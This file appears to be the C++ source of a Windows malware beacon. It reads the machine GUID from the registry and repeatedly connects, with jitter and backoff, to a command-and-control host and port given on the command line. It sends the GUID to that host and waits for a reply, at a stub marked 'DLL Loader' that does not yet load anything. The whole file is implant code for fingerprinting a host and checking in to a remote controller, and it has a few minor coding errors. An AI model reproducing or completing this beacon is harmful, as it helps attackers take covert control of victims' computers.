#include <iostream>
#include <string>
#include <sstream>

#define _WINSOCK_DEPRECATED_NO_WARNINGS
// Windows API
#include <WinSock2.h>
#include <Windows.h>

#define sleep(x) Sleep(1000 * (x))

#pragma  comment(lib,"ws2_32.lib")

void die(const char* message);
void reply(SOCKET s);
int rand_int(int max);

int main(int argc, char* argv[])
{
    char MachineGUID[37];
    DWORD BufferSize = sizeof(MachineGUID);
    ULONG nError;
    std::string guid = u8"";

   
    //UUID
    LONG res = RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", RRF_RT_REG_SZ, NULL, MachineGUID, &BufferSize);

    if (res == 0)
    {
        for (int i = 0; i < sizeof(MachineGUID); i++) {
            if (MachineGUID[i] != '-' && MachineGUID[i] != '\0') {
                guid = guid + MachineGUID[i];
            }
        }
        guid.insert(0, u8"♡");
        std::cout << guid << std::endl;
        std::cout << sizeof(guid) << std::endl;

    }
    else {
        std::cerr << res;
    }
    
    //BEACON LOOP 
    WSADATA wsa;
    SOCKET s;
    int retry_count;
    char* host = argv[1];
    int port = strtol(argv[2], NULL, 10);

    struct sockaddr_in server;

    std::cout << "\nInitialising Winsock...";
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        std::cout << "Failed. Error Code : %d", WSAGetLastError();
        return 1;
    }

    server.sin_addr.s_addr = inet_addr(host);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);

    retry_count = 0;
    while (1) {
        int jitter = rand_int(13);
        sleep(2 * jitter);

        if ((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
        {
            std::cout << "Error creating socket\n";
            retry_count += 1;
            sleep((5 * retry_count) * jitter);
            continue;
        }
        else
            std::cout << "Socket created\n";

        if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0)
        {
            std::cout << "connection error\n";
            retry_count += 1;
            sleep((5 * retry_count) * jitter);
            continue;
        }
        std::cout << "sending with uuid: " << guid << std::endl;
        std::cout << "connected to server\n";

        if (send(s, guid.c_str(), guid.length(), 0) < 0)
        {
            std::cout << "error while sending transmission\n";
            retry_count += 1;
            sleep((5 * retry_count) * jitter);
            continue;
        }
        reply((SOCKET)s);
        retry_count = 0;
        sleep(6 * jitter);
    }

    return 0;
}

void die(const char* message) {
    fprintf(stderr, message);
    exit(EXIT_FAILURE);
}

void reply(SOCKET s) {
    char buffer[512];
    int n;
    int size_recv, size_total = 0;


    for (;;) {
        memset(buffer, 0, 512);
        if ((size_recv = recv(s, buffer, sizeof(buffer), 0)) < 0) {
            closesocket(s);
            break;
        }
        else if (size_recv > 0) {
            //DLL Loader
            std::cout << ("Loading DLL...");
            break;
        }
        else
            closesocket(s);
        break;
    }
}

int rand_int(int max) {
    int divisor = RAND_MAX / (max + 1);
    int randint;

    do {
        randint = rand() / divisor;
    } while (randint > max);

    return randint;
}